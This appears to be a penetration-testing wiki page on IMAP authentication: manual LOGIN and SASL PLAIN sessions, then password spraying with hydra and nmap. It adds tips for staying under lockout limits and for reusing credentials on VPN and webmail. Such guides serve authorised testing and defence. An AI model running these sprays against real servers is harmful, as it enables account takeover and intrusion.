---
title: "Authentication: logging in and spraying IMAP credentials"
description: "Authenticating to IMAP: cleartext LOGIN on 143, SASL AUTHENTICATE PLAIN/LOGIN/CRAM-MD5 by hand, constructing the base64 PLAIN blob, and online password spraying with hydra and nmap against 993. Reads a OK versus a NO and explains what LOGINDISABLED forces."
keywords:
  - imap login
  - authenticate plain
  - cram-md5
  - imap password spray
  - hydra imap
---

# Authentication

IMAP offers two ways in. `LOGIN user pass` sends the credentials in the clear and is what most clients use once a TLS channel exists (993, or 143 after STARTTLS). `AUTHENTICATE <mechanism>` runs a SASL exchange: `PLAIN` and `LOGIN` still carry the password (base64, not encryption), while `CRAM-MD5` is a challenge-response that never sends the password itself. A tagged `a OK ... LOGIN completed` is a working credential; `a NO` is a rejection. Because mailbox accounts are frequently the same directory accounts used elsewhere, any hit is immediate reuse material.

## Preconditions

Run `CAPABILITY` first ([enumeration](enumeration.md)). If `LOGINDISABLED` is present on a cleartext 143 connection, `LOGIN` returns `a NO` until you negotiate STARTTLS, so either issue `a STARTTLS` and renegotiate, or just use 993. The `AUTH=` tokens tell you which `AUTHENTICATE` mechanisms will be accepted.

## Manual login

```bash
openssl s_client -connect <target>:993 -quiet
a LOGIN alice 'Sprint2025!'
a OK [CAPABILITY IMAP4rev1 ...] Logged in
```

`a OK` here is a valid credential and a live session you can immediately drive into [mailbox access](mailbox-access.md). `a NO [AUTHENTICATIONFAILED]` is a bad password or unknown user.

## AUTHENTICATE PLAIN by hand

SASL PLAIN is the string `authzid\0authcid\0password` (the authorization identity is normally left empty) base64-encoded. Build it and feed it to `AUTHENTICATE PLAIN`:

```bash
# authzid is empty, authcid=alice, password=Sprint2025!
printf '\0alice\0Sprint2025!' | base64
# -> AGFsaWNlAFNwcmludDIwMjUh
openssl s_client -connect <target>:993 -quiet
a AUTHENTICATE PLAIN
+
AGFsaWNlAFNwcmludDIwMjUh
a OK Logged in
```

The lone `+` is the server's continuation prompt asking for the base64 blob. With the `SASL-IR` capability you can inline it in one line: `a AUTHENTICATE PLAIN AGFsaWNlAFNwcmludDIwMjUh`. `AUTHENTICATE LOGIN` instead prompts twice, once for the base64 username and once for the base64 password. `CRAM-MD5` sends a base64 challenge you answer with `username <space> HMAC-MD5(challenge, password)` in hex, so it is only guessable offline if you capture a challenge/response pair.

## Spraying

Keep it slow and username-validated; servers log every failure and may rate-limit or ban on bursts.

```bash
# one password across validated users, implicit TLS on 993
hydra -L users.txt -p 'Sprint2025!' -s 993 -S <target> imap -t 4 -f
# single high-value account, short contextual list
hydra -l admin -P top-passwords.txt -s 993 -S <target> imap -t 4 -f
# nmap's IMAP brute module as an alternative driver
nmap -p993 --script imap-brute --script-args userdb=users.txt,passdb=pass.txt <target>
```

`-S` tells hydra to use implicit SSL/TLS (993); drop it for plaintext 143 and add the STARTTLS handling the server requires. Derive passwords from the organization (season+year, company name, breach data) rather than a generic giant list: `MaxAuthTries`-style limits and fail2ban make broad brute force self-defeating, and a short contextual spray lands far more reliably.

## Follow-on

A working credential goes straight to [mailbox access](mailbox-access.md), and should be replayed against SMTP submission, OWA/webmail, VPN, and the directory, since the same password usually unlocks all of them.

## Tools

- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [nmap imap-brute](https://nmap.org/nsedoc/scripts/imap-brute.html)

## References

- [RFC 4616: SASL PLAIN mechanism](https://datatracker.ietf.org/doc/html/rfc4616)
- [RFC 2195: CRAM-MD5](https://datatracker.ietf.org/doc/html/rfc2195)
- [HackTricks: pentesting IMAP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-imap.html)
